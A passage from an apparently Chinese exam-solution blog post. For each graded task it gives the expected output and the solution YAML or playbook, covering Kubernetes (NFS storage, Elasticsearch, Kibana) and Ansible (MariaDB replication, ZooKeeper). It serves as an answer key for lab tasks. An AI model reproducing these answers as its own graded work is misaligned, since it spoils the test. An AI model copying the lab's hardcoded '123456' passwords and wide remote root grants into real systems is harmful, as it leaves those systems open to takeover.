quay.io/external_storage/nfs-client-provisioner:latest</span><br><span class="line">          imagePullPolicy: IfNotPresent</span><br><span class="line">          volumeMounts:</span><br><span class="line">            - name: nfs-client-root</span><br><span class="line">              mountPath: /persistentvolumes</span><br><span class="line">          <span class="built_in">env</span>:</span><br><span class="line">            - name: PROVISIONER_NAME</span><br><span class="line">              value: k8s/nfs-subdir-external-provisioner</span><br><span class="line">            - name: NFS_SERVER</span><br><span class="line">              value: 192.168.157.10</span><br><span class="line">            - name: NFS_PATH</span><br><span class="line">              value: /data/volume1</span><br><span class="line">      volumes:</span><br><span class="line">        - name: nfs-client-root</span><br><span class="line">          nfs:</span><br><span class="line">            server: 192.168.157.10  <span class="comment"># NFS SERVER_IP</span></span><br><span class="line">            path: /data/volume1</span><br></pre></td></tr></table></figure>

<h3 id="6-StorageClass-动态绑定"><a href="#6-StorageClass-动态绑定" class="headerlink" title="6.StorageClass 动态绑定"></a>6.StorageClass 动态绑定</h3><p>编写 storageclass.yaml 文件，创建 storageclass 动态绑定 nfs-provisioner，完成后查看</p>
<p>nfs-provisioner 的 pod 及 storageclasses 对象。</p>
<p>将 kubectl get storageclasses.storage.k8s.io 命令的返回结果提交到答题框。【2 分】</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">[root@master rbac]#  kubectl get storageclasses.storage.k8s.io</span><br><span class="line">NAME                   PROVISIONER                           RECLAIMPOLICY   VOLUMEBINDINGMODE   ALLOWVOLUMEEXPANSION   AGE</span><br><span class="line">nfs-deploy (default)   k8s/nfs-subdir-external-provisioner   Delete          Immediate           <span class="literal">true</span>                   22m</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>解法:</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">[root@master nfs]# <span class="built_in">cat</span> storageclass.yml</span><br><span class="line">apiVersion: storage.k8s.io/v1</span><br><span class="line">kind: StorageClass</span><br><span class="line">metadata:</span><br><span class="line">  name: managed-nfs-storage</span><br><span class="line">provisioner: k8s/nfs-subdir-external-provisioner <span class="comment"># or choose another name, must match deployment&#x27;s env PROVISIONER_NAME&#x27;</span></span><br><span class="line">allowVolumeExpansion: <span class="literal">true</span></span><br><span class="line">parameters:</span><br><span class="line">  archiveOnDelete: <span class="string">&quot;false&quot;</span> <span class="comment"># 设置为&quot;false&quot;时删除PVC不会保留数据,&quot;true&quot;则保留数据</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h3 id="7-通过-statefulset-创建-elasticsearch-集群"><a href="#7-通过-statefulset-创建-elasticsearch-集群" class="headerlink" title="7.通过 statefulset 创建 elasticsearch 集群"></a>7.通过 statefulset 创建 elasticsearch 集群</h3><p>编写 es-statefulset.yaml，通过 yaml 文件构建 elasticsearch 的 statefulset 集群，集群中有</p>
<p>3 个副本名字分别为 es-cluster-0、es-cluster-1、es-cluster-2，并且使用上述 storageclass 提供</p>
<p>的存储，使用 elasticsearch:7.2.0 镜像，并且声明 9200 端口为 api 端口，9300 端口为内部访</p>
<p>问 端 口 ， 并 且 添 加 busybox 的 初 始 化 容 器 对 elasticsearch 的 数 据 目 录</p>
<p>&#x2F;usr&#x2F;share&#x2F;elasticsearch&#x2F;data 进行授权操作。</p>
<p>将 kubectl get pods 命令的返回结果提交到答题框。【2 分】</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">[root@master nfs]# kubectl get pod</span><br><span class="line">NAME                     READY   STATUS    RESTARTS   AGE</span><br><span class="line">es-cluster-0             1/1     Running   0          2m29s</span><br><span class="line">es-cluster-1             1/1     Running   0          112s</span><br><span class="line">es-cluster-2             1/1     Running   0          105s</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>解法:</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">[root@master nfs]# <span class="built_in">cat</span> es-statefulset.yaml</span><br><span class="line">apiVersion: apps/v1</span><br><span class="line">kind: StatefulSet</span><br><span class="line">metadata:</span><br><span class="line">  name: es-cluster</span><br><span class="line">spec:</span><br><span class="line">  serviceName: elasticsearch</span><br><span class="line">  replicas: 3</span><br><span class="line">  selector:</span><br><span class="line">    matchLabels:</span><br><span class="line">      app: elasticsearch</span><br><span class="line">  template:</span><br><span class="line">    metadata:</span><br><span class="line">      labels:</span><br><span class="line">        app: elasticsearch</span><br><span class="line">    spec:</span><br><span class="line">      initContainers:</span><br><span class="line">      - name: increase-vm-max-map</span><br><span class="line">        image: busybox</span><br><span class="line">        <span class="built_in">command</span>: [<span class="string">&quot;sysctl&quot;</span>, <span class="string">&quot;-w&quot;</span>, <span class="string">&quot;vm.max_map_count=262144&quot;</span>]</span><br><span class="line">        securityContext:</span><br><span class="line">          privileged: <span class="literal">true</span></span><br><span class="line">      - name: <span class="built_in">chmod</span> file</span><br><span class="line">        image: busybox</span><br><span class="line">        <span class="built_in">command</span>: [<span class="string">&quot;sh&quot;</span>,<span class="string">&quot;-c&quot;</span>,<span class="string">&quot;chown 1000:1000 /usr/share/elasticsearch/data&quot;</span>]</span><br><span class="line">        volumeMounts:</span><br><span class="line">        - name: es-pvc</span><br><span class="line">          mountPath: /usr/share/elasticsearch/data</span><br><span class="line">      - name: increase-fd-ulimit</span><br><span class="line">        image: busybox</span><br><span class="line">        <span class="built_in">command</span>: [<span class="string">&quot;sh&quot;</span>, <span class="string">&quot;-c&quot;</span>, <span class="string">&quot;ulimit -n 65536&quot;</span>]</span><br><span class="line">        securityContext:</span><br><span class="line">          privileged: <span class="literal">true</span></span><br><span class="line">      containers:</span><br><span class="line">      - name: elasticsearch</span><br><span class="line">        image: elasticsearch:7.2.0</span><br><span class="line">        ports:</span><br><span class="line">        - name: db</span><br><span class="line">          containerPort: 9200</span><br><span class="line">        - name: int</span><br><span class="line">          containerPort: 9300</span><br><span class="line">        resources:</span><br><span class="line">          limits:</span><br><span class="line">            cpu: 1000m</span><br><span class="line">          requests:</span><br><span class="line">            cpu: 1000m</span><br><span class="line">        volumeMounts:</span><br><span class="line">        - name: es-pvc</span><br><span class="line">          mountPath: /usr/share/elasticsearch/data</span><br><span class="line">        <span class="built_in">env</span>:</span><br><span class="line">        - name: cluster.name</span><br><span class="line">          value: k8s-logs</span><br><span class="line">        - name: node.name</span><br><span class="line">          valueFrom:</span><br><span class="line">            fieldRef:</span><br><span class="line">              fieldPath: metadata.name</span><br><span class="line">        - name: cluster.initial_master_nodes</span><br><span class="line">          value: <span class="string">&quot;es-cluster-0,es-cluster-1,es-cluster-2&quot;</span></span><br><span class="line">        - name: discovery.zen.minimum_master_nodes</span><br><span class="line">          value: <span class="string">&quot;2&quot;</span></span><br><span class="line">        - name: discovery.seed_hosts</span><br><span class="line">          value: <span class="string">&quot;elasticsearch&quot;</span></span><br><span class="line">        - name: ES_JAVA_OPTS</span><br><span class="line">          value: <span class="string">&quot;-Xms512m -Xmx512m&quot;</span></span><br><span class="line">        - name: network.host</span><br><span class="line">          value: <span class="string">&quot;0.0.0.0&quot;</span></span><br><span class="line">  volumeClaimTemplates:</span><br><span class="line">  - metadata:</span><br><span class="line">      name: es-pvc</span><br><span class="line">      labels:</span><br><span class="line">        app: elasticsearch</span><br><span class="line">    spec:</span><br><span class="line">      accessModes: [ <span class="string">&quot;ReadWriteMany&quot;</span> ]</span><br><span class="line">      storageClassName: <span class="string">&quot;managed-nfs-storage&quot;</span></span><br><span class="line">      resources:</span><br><span class="line">        requests:</span><br><span class="line">          storage: 10Gi</span><br><span class="line"></span><br></pre></td></tr></table></figure>



<h3 id="8-创建-headless-service"><a href="#8-创建-headless-service" class="headerlink" title="8.创建 headless service"></a>8.创建 headless service</h3><p>编写 es-svc.yaml 文件，为 elasticsearch 的 pod 创建一个 headless service，并在 service</p>
<p>中声明 9200 和 9300 端口。</p>
<p>将 kubectl get svc 命令的返回结果提交到答题框。【2 分】</p>
<p>es-svc.yaml</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">[root@master nfs]# kubectl get svc</span><br><span class="line">NAME            TYPE        CLUSTER-IP   EXTERNAL-IP   PORT(S)             AGE</span><br><span class="line">elasticsearch   ClusterIP   None         &lt;none&gt;        9200/TCP,9300/TCP   17s</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>解法:</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">[root@master nfs]# <span class="built_in">cat</span> es-svc.yaml</span><br><span class="line">kind: Service</span><br><span class="line">apiVersion: v1</span><br><span class="line">metadata:</span><br><span class="line">  name: elasticsearch</span><br><span class="line">  labels:</span><br><span class="line">    app: elasticsearch</span><br><span class="line">spec:</span><br><span class="line">  selector:</span><br><span class="line">    app: elasticsearch</span><br><span class="line">  clusterIP: None</span><br><span class="line">  ports:</span><br><span class="line">    - port: 9200</span><br><span class="line">      name: api</span><br><span class="line">    - port: 9300</span><br><span class="line">      name: int</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h3 id="9-Kibana-可视化-UI-界面部署"><a href="#9-Kibana-可视化-UI-界面部署" class="headerlink" title="9.Kibana 可视化 UI 界面部署"></a>9.Kibana 可视化 UI 界面部署</h3><p>编写 kibana.yaml，通过该文件创建 deployment 和 service，其中 deployment 基于</p>
<p>kibana:7.2.0 镜像创建并通过环境变量 ELASTICSEARCH_URL 指定 elasticsearch 服务地址；</p>
<p>service 代理 kibana 的 pod 服务，并且使用 NodePort 类型。创建成功后在浏览器访问 Kibana</p>
<p>的 UI 界面。</p>
<p>将 kubectl get svc 命令的返回结果提交到答题框。【2 分】</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">[root@master nfs]# kubectl get svc</span><br><span class="line">NAME            TYPE        CLUSTER-IP       EXTERNAL-IP   PORT(S)             AGE</span><br><span class="line">elasticsearch   ClusterIP   None             &lt;none&gt;        9200/TCP,9300/TCP   12m</span><br><span class="line">kibana          NodePort    10.104.107.171   &lt;none&gt;        5601:30601/TCP      82s</span><br><span class="line">kubernetes      ClusterIP   10.96.0.1        &lt;none&gt;        443/TCP             5d7h</span><br></pre></td></tr></table></figure>

<p>解法:</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">[root@master nfs]# <span class="built_in">cat</span> kibana.yml</span><br><span class="line">apiVersion: apps/v1</span><br><span class="line">kind: Deployment</span><br><span class="line">metadata:</span><br><span class="line">  name: kibana</span><br><span class="line">  labels:</span><br><span class="line">    k8s-app: kibana</span><br><span class="line">spec:</span><br><span class="line">  replicas: 1</span><br><span class="line">  selector:</span><br><span class="line">    matchLabels:</span><br><span class="line">      k8s-app: kibana</span><br><span class="line">  template:</span><br><span class="line">    metadata:</span><br><span class="line">      labels:</span><br><span class="line">        k8s-app: kibana</span><br><span class="line">    spec:</span><br><span class="line">      containers:</span><br><span class="line">      - name: kibana</span><br><span class="line">        image: kibana:7.2.0</span><br><span class="line">        resources:</span><br><span class="line">          limits:</span><br><span class="line">            cpu: 2</span><br><span class="line">            memory: 2Gi</span><br><span class="line">          requests:</span><br><span class="line">            cpu: 0.5</span><br><span class="line">            memory: 500Mi</span><br><span class="line">        <span class="built_in">env</span>:</span><br><span class="line">          - name: ELASTICSEARCH_HOSTS</span><br><span class="line">            value: http://elasticsearch.default:9200</span><br><span class="line">          - name: ELASTICSEARCH_URL</span><br><span class="line">            value: http://elasticsearch.default:9200</span><br><span class="line">          - name: I18N_LOCALE</span><br><span class="line">            value: zh-CN</span><br><span class="line">        ports:</span><br><span class="line">        - containerPort: 5601</span><br><span class="line">          name: ui</span><br><span class="line">          protocol: TCP</span><br><span class="line"></span><br><span class="line">---</span><br><span class="line">apiVersion: v1</span><br><span class="line">kind: Service</span><br><span class="line">metadata:</span><br><span class="line">  name: kibana</span><br><span class="line">spec:</span><br><span class="line">  <span class="built_in">type</span>: NodePort</span><br><span class="line">  ports:</span><br><span class="line">  - port: 5601</span><br><span class="line">    protocol: TCP</span><br><span class="line">    targetPort: ui</span><br><span class="line">    nodePort: 30601</span><br><span class="line">  selector:</span><br><span class="line">    k8s-app: kibana</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h3 id="10-Fluentd-组件部署"><a href="#10-Fluentd-组件部署" class="headerlink" title="10.Fluentd 组件部署"></a>10.Fluentd 组件部署</h3><p>编写 fluentd.yaml，通过 yaml 文件创建 DaemonSet 控制器部署 fluentd 服务，并在该文</p>
<p>件中同时编写相关的 sa 账号和 rbac 内容，创建成功后保证可以正确采集容器内的日志。</p>
<p>将 kubectl get pods 命令的返回结果提交到答题框。【2 分】</p>
<h1 id="C-模块题目：企业级应用的自动化部署和运维"><a href="#C-模块题目：企业级应用的自动化部署和运维" class="headerlink" title="C 模块题目：企业级应用的自动化部署和运维"></a><strong>C</strong> 模块题目：企业级应用的自动化部署和运维</h1><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="comment">###环境</span></span><br><span class="line">192.168.157.20 ansible-control ansible</span><br><span class="line">192.168.157.21 ansible-compute1 host1</span><br><span class="line">192.168.157.22 ansible-compute2 host2</span><br><span class="line">192.168.157.23 ansible-compute3</span><br></pre></td></tr></table></figure>



<h2 id="任务-1-企业级应用的自动化部署（10-分）"><a href="#任务-1-企业级应用的自动化部署（10-分）" class="headerlink" title="任务 1 企业级应用的自动化部署（10 分）"></a><strong>任务 1 企业级应用的自动化部署（10 分）</strong></h2><h3 id="1-Ansible-自动化运维工具部署主从数据库"><a href="#1-Ansible-自动化运维工具部署主从数据库" class="headerlink" title="1.Ansible 自动化运维工具部署主从数据库"></a>1.Ansible 自动化运维工具部署主从数据库</h3><p>（1）修改主机名 ansible 节点主机名为 ansible,host1 节点主机名为 host1,host2 节点主机名为</p>
<p>host2,请使用提供的软件包在 ansible 节点安装 ansible。</p>
<p>将 ansible –version 命令的返回结果提交到答题框。【1 分】</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">[root@ansible ~]#  ansible --version</span><br><span class="line">ansible 2.9.27</span><br><span class="line">  config file = /etc/ansible/ansible.cfg</span><br><span class="line">  configured module search path = [u<span class="string">&#x27;/root/.ansible/plugins/modules&#x27;</span>, u<span class="string">&#x27;/usr/share/ansible/plugins/modules&#x27;</span>]</span><br><span class="line">  ansible python module location = /usr/lib/python2.7/site-packages/ansible</span><br><span class="line">  executable location = /usr/bin/ansible</span><br><span class="line">  python version = 2.7.5 (default, Apr 11 2018, 07:36:10) [GCC 4.8.5 20150623 (Red Hat 4.8.5-28)]</span><br></pre></td></tr></table></figure>

<p>解法:</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="comment">#设置主机名(其他节点同理)</span></span><br><span class="line">hostnamectl set-hostname ansible</span><br><span class="line"><span class="comment">#安装依赖</span></span><br><span class="line">[root@ansible ~]# yum install -y jinja2 PyYAML cryptography</span><br><span class="line"></span><br><span class="line">[root@ansible ~]# rpm -ivh ansible-2.4.6.0-1.el7.ans.noarch.rpm</span><br><span class="line"></span><br><span class="line">[root@ansible ~]# ansible --version</span><br></pre></td></tr></table></figure>

<p>（2）配置主机清单文件，创建 mysql 主机组，mysql 主机组内添加 host1 和 host2 主机；创</p>
<p>建 mysql1 主机组，mysql1 组内添加 host1 主机；创建 mysql2 主机组，mysql2 组内添加 host2</p>
<p>主机，并配置免密登录。</p>
<p>将 ansible all -m ping 命令的返回结果提交到答题框。【1 分】</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">[root@ansible ~]# ansible all -m ping</span><br><span class="line">host2 | SUCCESS =&gt; &#123;</span><br><span class="line">    <span class="string">&quot;ansible_facts&quot;</span>: &#123;</span><br><span class="line">        <span class="string">&quot;discovered_interpreter_python&quot;</span>: <span class="string">&quot;/usr/bin/python&quot;</span></span><br><span class="line">    &#125;,</span><br><span class="line">    <span class="string">&quot;changed&quot;</span>: <span class="literal">false</span>,</span><br><span class="line">    <span class="string">&quot;ping&quot;</span>: <span class="string">&quot;pong&quot;</span></span><br><span class="line">&#125;</span><br><span class="line">host1 | SUCCESS =&gt; &#123;</span><br><span class="line">    <span class="string">&quot;ansible_facts&quot;</span>: &#123;</span><br><span class="line">        <span class="string">&quot;discovered_interpreter_python&quot;</span>: <span class="string">&quot;/usr/bin/python&quot;</span></span><br><span class="line">    &#125;,</span><br><span class="line">    <span class="string">&quot;changed&quot;</span>: <span class="literal">false</span>,</span><br><span class="line">    <span class="string">&quot;ping&quot;</span>: <span class="string">&quot;pong&quot;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>解法:</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">[[root@ansible ~]# <span class="built_in">cat</span> /etc/ansible/hosts</span><br><span class="line">[mysql]</span><br><span class="line">host1</span><br><span class="line">host2</span><br><span class="line">[mysql1]</span><br><span class="line">host1</span><br><span class="line">[mysql2]</span><br><span class="line">host2</span><br><span class="line"></span><br><span class="line"><span class="comment">##设置免密登录</span></span><br><span class="line">[root@ansible ~]# ssh-keygen</span><br><span class="line"></span><br><span class="line">[root@ansible ~]# ssh-copy-id <span class="built_in">test</span>@192.168.157.20</span><br><span class="line">[root@ansible ~]# ssh-copy-id <span class="built_in">test</span>@192.168.157.21</span><br><span class="line">[root@ansible ~]# ssh-copy-id <span class="built_in">test</span>@192.168.157.22</span><br></pre></td></tr></table></figure>

<p>（3）mysql 主机组内所有主机安装 mariadb 数据库，启动数据库并设置为开机自启动。</p>
<p>在 host1 节点将 systemctl status mariadb 命令的返回结果提交到答题框。【1 分】</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">[root@host1 ~]# systemctl status mariadb</span><br><span class="line">● mariadb.service - MariaDB database server</span><br><span class="line">   Loaded: loaded (/usr/lib/systemd/system/mariadb.service; enabled; vendor preset: disabled)</span><br><span class="line">   Active: active (running) since Thu 2023-03-16 01:04:32 EDT; 56min ago</span><br><span class="line">  Process: 992 ExecStartPost=/usr/libexec/mariadb-wait-ready <span class="variable">$MAINPID</span> (code=exited, status=0/SUCCESS)</span><br><span class="line">  Process: 897 ExecStartPre=/usr/libexec/mariadb-prepare-db-dir %n (code=exited, status=0/SUCCESS)</span><br><span class="line"> Main PID: 990 (mysqld_safe)</span><br><span class="line">   CGroup: /system.slice/mariadb.service</span><br><span class="line">           ├─ 990 /bin/sh /usr/bin/mysqld_safe --basedir=/usr</span><br><span class="line">           └─1259 /usr/libexec/mysqld --basedir=/usr --datadir=/var/lib/mysql --plugin-dir=/usr/lib64/mysql/plugin --log-error=/var/log/mariadb/mariadb.log...</span><br><span class="line"></span><br><span class="line">Mar 16 01:04:30 ansible-compute1 systemd[1]: Starting MariaDB database server...</span><br><span class="line">Mar 16 01:04:30 ansible-compute1 mariadb-prepare-db-dir[897]: Database MariaDB is probably initialized <span class="keyword">in</span> /var/lib/mysql already, nothing is <span class="keyword">done</span>.</span><br><span class="line">Mar 16 01:04:30 ansible-compute1 mariadb-prepare-db-dir[897]: If this is not the <span class="keyword">case</span>, make sure the /var/lib/mysql is empty before running mariadb-...db-dir.</span><br><span class="line">Mar 16 01:04:30 ansible-compute1 mysqld_safe[990]: 230316 01:04:30 mysqld_safe Logging to <span class="string">&#x27;/var/log/mariadb/mariadb.log&#x27;</span>.</span><br><span class="line">Mar 16 01:04:30 ansible-compute1 mysqld_safe[990]: 230316 01:04:30 mysqld_safe Starting mysqld daemon with databases from /var/lib/mysql</span><br><span class="line">Mar 16 01:04:32 ansible-compute1 systemd[1]: Started MariaDB database server.</span><br><span class="line">Hint: Some lines were ellipsized, use -l to show <span class="keyword">in</span> full.</span><br></pre></td></tr></table></figure>

<p>解法:</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">[root@ansible ~]# <span class="built_in">cat</span> mysql.yaml</span><br><span class="line">---</span><br><span class="line">- name: install mariadb</span><br><span class="line">  hosts: mysql</span><br><span class="line">  tasks:</span><br><span class="line">  - name: install mariadb</span><br><span class="line">    yum: name=mariadb-server state=present</span><br><span class="line">  - name: start mariadb</span><br><span class="line">    service: name=mariadb state=started enabled=<span class="built_in">yes</span></span><br><span class="line"></span><br><span class="line">[root@ansible ~]# ansible-playbook  mysql.yaml</span><br></pre></td></tr></table></figure>

<p>（4）编写一名称为 mariadb.sh 的 shell 脚本，该脚本具有完成 mariadb 数据库的初始化功能</p>
<p>(要求数据库用户名为 root,密码为 123456)，通过 ansible 对应模块执行 mariadb.sh 完成对</p>
<p>mysql 主机组下的所有节点进行数据库初始化。</p>
<p>在 node1 节点，将 mysql -uroot -p123456 命令的返回结果提交到答题框。【1 分】</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">[root@host1 ~]#  mysql -uroot -p123456</span><br><span class="line">Welcome to the MariaDB monitor.  Commands end with ; or \g.</span><br><span class="line">Your MariaDB connection <span class="built_in">id</span> is 3</span><br><span class="line">Server version: 5.5.68-MariaDB MariaDB Server</span><br><span class="line"></span><br><span class="line">Copyright (c) 2000, 2018, Oracle, MariaDB Corporation Ab and others.</span><br><span class="line"></span><br><span class="line">Type <span class="string">&#x27;help;&#x27;</span> or <span class="string">&#x27;\h&#x27;</span> <span class="keyword">for</span> <span class="built_in">help</span>. Type <span class="string">&#x27;\c&#x27;</span> to clear the current input statement.</span><br><span class="line"></span><br><span class="line">MariaDB [(none)]&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>解法:</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">[root@ansible ~]# <span class="built_in">cat</span> mariadb.sh</span><br><span class="line"><span class="comment">#!/bin/bash</span></span><br><span class="line">mysqladmin -u root password <span class="string">&quot;123456&quot;</span></span><br><span class="line">[root@ansible ~]# <span class="built_in">cat</span> mysql-sh.yaml</span><br><span class="line">---</span><br><span class="line">- name: init mariadb</span><br><span class="line">  hosts: mysql</span><br><span class="line">  tasks:</span><br><span class="line">    - name: init mariadb</span><br><span class="line">      script: /root/mariadb.sh</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>（5）创建主机变量，所有主机组中 host1 节点创建变量 id&#x3D;20,hots2 节点创建变量 id&#x3D;30。</p>
<p>将 cat &#x2F;etc&#x2F;ansible&#x2F;hosts | grep id 命令的返回结果提交到答题框。【1 分】</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">[root@ansible ~]#  <span class="built_in">cat</span> /etc/ansible/hosts | grep <span class="built_in">id</span></span><br><span class="line"><span class="built_in">id</span>=20</span><br><span class="line"><span class="built_in">id</span>=30</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>解法:</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">[root@ansible ~]# <span class="built_in">cat</span> /etc/ansible/hosts</span><br><span class="line">[mysql]</span><br><span class="line">host1</span><br><span class="line">host2</span><br><span class="line">[mysql1]</span><br><span class="line">host1</span><br><span class="line">[mysql2]</span><br><span class="line">host2</span><br><span class="line">[mysql1:vars]</span><br><span class="line"><span class="built_in">id</span>=20</span><br><span class="line">[mysql2:vars]</span><br><span class="line"><span class="built_in">id</span>=30</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>（6）根据 mysql 配置文件创建 mysql 的 Janja2 模板文件命名为 my.cnf.j2,编写 mariadb.yaml</p>
<p>文件实现主从数据库的配置和权限设置。</p>
<p>在 ansible 节点通过 cat mariadb.yaml 命令查看文件内容返回结果提交到答题框，在 host2</p>
<p>节点进入数据库将 show slave status \G 命令的返回结果提交到答题框。【1 分】</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">MariaDB [(none)]&gt; show slave status \G;</span><br><span class="line">*************************** 1. row ***************************</span><br><span class="line">               Slave_IO_State: Waiting <span class="keyword">for</span> master to send event</span><br><span class="line">                  Master_Host: 192.168.157.21</span><br><span class="line">                  Master_User: user</span><br><span class="line">                  Master_Port: 3306</span><br><span class="line">                Connect_Retry: 60</span><br><span class="line">              Master_Log_File: mysql-bin.000001</span><br><span class="line">          Read_Master_Log_Pos: 524</span><br><span class="line">               Relay_Log_File: ansible-compute2-relay-bin.000002</span><br><span class="line">                Relay_Log_Pos: 808</span><br><span class="line">        Relay_Master_Log_File: mysql-bin.000001</span><br><span class="line">             Slave_IO_Running: Yes</span><br><span class="line">            Slave_SQL_Running: Yes</span><br><span class="line">              Replicate_Do_DB:</span><br><span class="line">          Replicate_Ignore_DB:</span><br><span class="line">           Replicate_Do_Table:</span><br><span class="line">       Replicate_Ignore_Table:</span><br><span class="line">      Replicate_Wild_Do_Table:</span><br><span class="line">  Replicate_Wild_Ignore_Table:</span><br><span class="line">                   Last_Errno: 0</span><br><span class="line">                   Last_Error:</span><br><span class="line">                 Skip_Counter: 0</span><br><span class="line">          Exec_Master_Log_Pos: 524</span><br><span class="line">              Relay_Log_Space: 1113</span><br><span class="line">              Until_Condition: None</span><br><span class="line">               Until_Log_File:</span><br><span class="line">                Until_Log_Pos: 0</span><br><span class="line">           Master_SSL_Allowed: No</span><br><span class="line">           Master_SSL_CA_File:</span><br><span class="line">           Master_SSL_CA_Path:</span><br><span class="line">              Master_SSL_Cert:</span><br><span class="line">            Master_SSL_Cipher:</span><br><span class="line">               Master_SSL_Key:</span><br><span class="line">        Seconds_Behind_Master: 0</span><br><span class="line">Master_SSL_Verify_Server_Cert: No</span><br><span class="line">                Last_IO_Errno: 0</span><br><span class="line">                Last_IO_Error:</span><br><span class="line">               Last_SQL_Errno: 0</span><br><span class="line">               Last_SQL_Error:</span><br><span class="line">  Replicate_Ignore_Server_Ids:</span><br><span class="line">             Master_Server_Id: 20</span><br><span class="line">1 row <span class="keyword">in</span> <span class="built_in">set</span> (0.00 sec)</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>解法:</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="built_in">cat</span> my.cnf.j2</span><br><span class="line">[mysqld]</span><br><span class="line">log_bin=mysql-bin</span><br><span class="line">server_id=&#123;&#123; <span class="built_in">id</span> &#125;&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">[root@ansible ~]# <span class="built_in">cat</span> mariadb.yaml</span><br><span class="line">---</span><br><span class="line">- name: config mariadb</span><br><span class="line">  hosts: mysql1,mysql2</span><br><span class="line">  tasks:</span><br><span class="line">  - name: config my.cnf</span><br><span class="line">    template: src=my.cnf.j2 dest=/etc/my.cnf</span><br><span class="line">  - name: restart mariadb</span><br><span class="line">    service: name=mariadb state=restarted enabled=<span class="built_in">yes</span></span><br><span class="line">  - name: grant user</span><br><span class="line">    shell: mysql -uroot -p123456 -e <span class="string">&quot;grant all privileges on *.* to root@&#x27;%&#x27; identified by &#x27;123456&#x27;;&quot;</span></span><br><span class="line">    when: inventory_hostname <span class="keyword">in</span> groups.mysql1</span><br><span class="line">  - name: master create user</span><br><span class="line">    shell: mysql -uroot -p123456 -e <span class="string">&quot;grant replication slave on *.* to &#x27;user&#x27;@&#x27;%&#x27; identified by &#x27;123456&#x27;;&quot;</span></span><br><span class="line">    when: inventory_hostname <span class="keyword">in</span> groups.mysql1</span><br><span class="line">  - name: node</span><br><span class="line">    shell: mysql -uroot -p123456 -e <span class="string">&quot;change master to master_host=&#x27;192.168.157.21&#x27;,master_user=&#x27;user&#x27;,master_password=&#x27;123456&#x27;;&quot;</span></span><br><span class="line">    when: inventory_hostname <span class="keyword">in</span> groups.mysql2</span><br><span class="line">  - name: start slave</span><br><span class="line">    shell: mysql -uroot -p123456 -e <span class="string">&quot;start slave;&quot;</span></span><br><span class="line">    when: inventory_hostname <span class="keyword">in</span> groups.mysql2</span><br><span class="line"></span><br></pre></td></tr></table></figure>



<h3 id="2-Ansible-自动化运维工具部署-zookeeper-集群"><a href="#2-Ansible-自动化运维工具部署-zookeeper-集群" class="headerlink" title="2.Ansible 自动化运维工具部署 zookeeper 集群"></a>2.Ansible 自动化运维工具部署 zookeeper 集群</h3><p>zookeeper 是一个分布式服务框架，是 Apache Hadoop 的一个子项目，主要是用来解决</p>
<p>分布式应用中经常遇到的一些数据管理问题，如：统一命名服务、状态同步服务、集群管理、</p>
<p>分布式应用配置项的管理等。gpmall 商城系统中用到了 kafka 消息队列，kafka 集群的搭建</p>
<p>依赖 zookeeper 集群来进行元数据的管理。</p>
<p>（1）编写主机清单文件，创建 zookeeper 主机组，zookeeper 主机组内添加 ansible、host1</p>
<p>和 host2 主机，分别创建主机变量 zk_id&#x3D;私有 IP 最后一个数字。</p>
<p>将 ansible all -a “id”命令的返回结果提交到答题框。【2 分】</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">root@ansible ~]# ansible all -a <span class="string">&quot;id&quot;</span></span><br><span class="line">ansible | CHANGED | rc=0 &gt;&gt;</span><br><span class="line">uid=0(root) gid=0(root) <span class="built_in">groups</span>=0(root) context=unconfined_u:unconfined_r:unconfined_t:s0-s0:c0.c1023</span><br><span class="line">host1 | CHANGED | rc=0 &gt;&gt;</span><br><span class="line">uid=0(root) gid=0(root) <span class="built_in">groups</span>=0(root) context=unconfined_u:unconfined_r:unconfined_t:s0-s0:c0.c1023</span><br><span class="line">host2 | CHANGED | rc=0 &gt;&gt;</span><br><span class="line">uid=0(root) gid=0(root) <span class="built_in">groups</span>=0(root) context=unconfined_u:unconfined_r:unconfined_t:s0-s0:c0.c1023</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>解法:</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">[root@ansible ~]# <span class="built_in">cat</span> /etc/ansible/hosts</span><br><span class="line">[zookeeper]</span><br><span class="line">ansible zk_id=1</span><br><span class="line">host1 zk_id=2</span><br><span class="line">host2 zk_id=3</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>（2）在 ansible 节点，使用提供的 zookeeper-3.4.14.tar.gz 软件包，编写 zookeeper.yaml 文件,</p>
